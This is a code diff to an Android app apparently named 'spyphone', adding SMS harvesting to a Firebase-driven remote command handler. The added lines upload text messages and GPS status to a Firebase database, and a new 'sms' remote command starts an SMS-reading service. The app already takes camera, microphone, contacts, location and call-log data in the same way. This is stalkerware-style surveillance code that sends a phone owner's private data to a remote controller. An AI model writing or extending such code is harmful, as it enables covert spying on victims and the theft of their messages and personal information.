@@ -23,6 +23,7 @@ import emit.esy.es.spyphone.services.CameraService;
 import emit.esy.es.spyphone.services.ContactsService;
 import emit.esy.es.spyphone.services.LocationService;
 import emit.esy.es.spyphone.services.MicrophoneService;
+import emit.esy.es.spyphone.services.SmsService;
 
 /**
  * Created by Emil Makovac on 24/04/2015.
@@ -117,6 +118,8 @@ public class FirebaseUtil {
                 break;
             case "cords":
                 content = data.getDoubleArray("content");
+                boolean gpsEnabled = data.getBoolean("gpsEnabled");
+                aw.put("gpsEnabled", gpsEnabled);
                 break;
             case "contacts":
                 content = data.getSerializable("content");
@@ -124,6 +127,10 @@ public class FirebaseUtil {
             case "callLog":
                 content = data.getSerializable("content");
                 break;
+            case "sms":
+                content = data.getSerializable("content");
+                break;
+
         }
         aw.put("content", content);
         uploadRef.setValue(aw);
@@ -159,6 +166,13 @@ public class FirebaseUtil {
                         case "photo":
                             Log.d(LOG_TAG, "Starting photo service");
                             intent = new Intent(mcontext, CameraService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        case "sms":
+                            Log.d(LOG_TAG, "Starting sms service");
+                            intent = new Intent(mcontext, SmsService.class);
                             intent.putExtra("messenger", new Messenger(handler));
                             mcontext.startService(intent);
                             setOnDefaultAndroidRead(dataSnapshot);
